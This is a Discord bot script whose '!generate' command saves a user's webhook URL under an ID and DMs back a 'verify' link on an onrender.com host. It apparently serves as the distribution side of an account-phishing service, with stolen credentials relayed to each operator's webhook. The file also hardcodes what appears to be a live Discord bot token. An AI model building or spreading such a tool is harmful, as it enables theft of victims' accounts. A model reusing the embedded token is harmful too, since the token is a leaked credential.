const Discord = require('discord.js');
const crypto = require('crypto');
const fs = require('fs');
const client = new Discord.Client({ intents: [Discord.Intents.FLAGS.GUILDS, Discord.Intents.FLAGS.GUILD_MESSAGES] });

const PREFIX = '!'; // Command prefix
const configFilePpath = 'config.txt'; // Path to the config file

client.once('ready', () => {
  console.log(`Logged in as ${client.user.tag}`);
});

client.on('messageCreate', async (message) => {
  if (message.content.startsWith(`${PREFIX}generate`)) {
    const args = message.content.slice(PREFIX.length).trim().split(' ');

    // Check for webhook and id arguments
    if (args.length < 2) {
      message.reply('Please provide a webhook URL and an optional ID.');
      return;
    }

    const webhookURL = args[1];
    const userId = args[2] || crypto.randomBytes(8).toString('hex');

    // Read the existing configuration from the file
    let config = {};
    try {
      const configFile = fs.readFileSync(configFilePpath, 'utf8');
      const configLines = configFile.split('\n');

      configLines.forEach((line) => {
        const [id, webhook] = line.split('=');
        if (id && webhook) {
          config[id] = webhook;
        }
      });
    } catch (error) {
      console.error('Error reading config:', error.message);
    }

    // Check if the user already has an entry in the config
    if (config[userId]) {
      message.reply('You already have a webhook in the config.');
      return;
    }

    // Add the user's entry to the config
    config[userId] = webhookURL;

    // Write the updated configuration back to the file
    const configText = Object.entries(config)
      .map(([id, webhook]) => `${id}=${webhook}`)
      .join('\n');

    fs.writeFileSync(configFilePpath, configText, 'utf8');
    console.log('Configuration saved to config.txt');

    // Send the user their URL
    message.author.send({
      content: 'Here is your webhook URL:',
      embeds: [{
        title: `Webhook URL for ID=${userId}`,
        description: webhookURL,
      }]
    });

    message.author.send(`You can use this link to redirect to your authentication: https://hyhelperfun.onrender.com/verify/${userId}`);
  }
});

client.login('MTE3OTg2NzI4MjQyMDI4NTQ0MA.GuZ3fr.vJD6WL4fapvM7JDs0UNwwjK_GHpkzFoBV-WG80'); // Replace with your bot's token
